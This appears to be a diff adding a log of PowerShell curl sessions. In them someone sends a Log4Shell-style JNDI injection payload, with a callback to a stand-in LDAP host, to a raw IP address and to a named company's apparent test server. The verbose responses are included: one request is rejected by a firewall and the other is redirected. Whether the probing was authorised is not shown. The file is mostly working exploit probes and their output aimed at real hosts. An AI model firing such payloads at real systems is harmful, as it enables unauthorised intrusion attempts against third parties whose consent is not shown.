@@ -1,0 +1,63 @@
+
+curl -k -X POST "https://91.214.7.236/?parameter=$%7Bjndi:ldap://example.com%7D" -vv
+
+PS C:\Users\Sanket> curl -k -X POST "https://91.214.7.236/?parameter=$%7Bjndi:ldap://example.com%7D" -vv
+*   Trying 91.214.7.236:443...
+* Connected to 91.214.7.236 (91.214.7.236) port 443
+* schannel: disabled automatic use of client certificate
+* schannel: using IP address, SNI is not supported by OS.
+* ALPN: curl offers http/1.1
+* ALPN: server did not agree on a protocol. Uses default.
+* using HTTP/1.x
+> POST /?parameter=$%7Bjndi:ldap://example.com%7D HTTP/1.1
+> Host: 91.214.7.236
+> User-Agent: curl/8.4.0
+> Accept: */*
+>
+< HTTP/1.1 200 OK
+< X-Frame-Options: SAMEORIGIN
+< X-XSS-Protection: 1; mode=block
+< X-Content-Type-Options: nosniff
+< Cache-Control: no-cache
+< Connection: close
+< Content-Type: text/html; charset=utf-8
+< Pragma: no-cache
+< Content-Length: 246
+<
+<html><head><title>Request Rejected</title></head><body>The requested URL was rejected. Please consult with your administrator.<br><br>Your support ID is: 3352735602653680480<br><br><a href='javascript:history.back();'>[Go Back]</a></body></html>* Closing connection
+* schannel: shutting down SSL/TLS connection with 91.214.7.236 port 443
+PS C:\Users\Sanket>
+PS C:\Users\Sanket>
+
+curl -k -X POST "https://uat.comshub-msb.markandspencer.com/?parameter=$%7Bjndi:ldap://example.com%7D" -vv
+
+
+
+PS C:\Users\Sanket> curl -k -X POST "https://uat.comshub-msb.markandspencer.com/?parameter=$%7Bjndi:ldap://example.com%7D" -vv
+*   Trying 103.224.182.246:443...
+* Connected to uat.comshub-msb.markandspencer.com (103.224.182.246) port 443
+* schannel: disabled automatic use of client certificate
+* ALPN: curl offers http/1.1
+* ALPN: server did not agree on a protocol. Uses default.
+* using HTTP/1.x
+> POST /?parameter=$%7Bjndi:ldap://example.com%7D HTTP/1.1
+> Host: uat.comshub-msb.markandspencer.com
+> User-Agent: curl/8.4.0
+> Accept: */*
+>
+* schannel: server closed the connection
+< HTTP/1.1 302 Found
+< date: Thu, 02 May 2024 12:44:08 GMT
+< server: Apache
+< set-cookie: __tad=1714653848.7964710; expires=Sun, 30-Apr-2034 12:44:08 GMT; Max-Age=315360000
+< location: http://ww25.uat.comshub-msb.markandspencer.com/?parameter=$%7Bjndi:ldap://example.com%7D&subid1=20240502-2244-08a3-818e-b061c2c2ce52
+< content-length: 2
+< content-type: text/html; charset=UTF-8
+< connection: close
+<
+
+
+* Closing connection
+* schannel: shutting down SSL/TLS connection with uat.comshub-msb.markandspencer.com port 443
+PS C:\Users\Sanket>
+
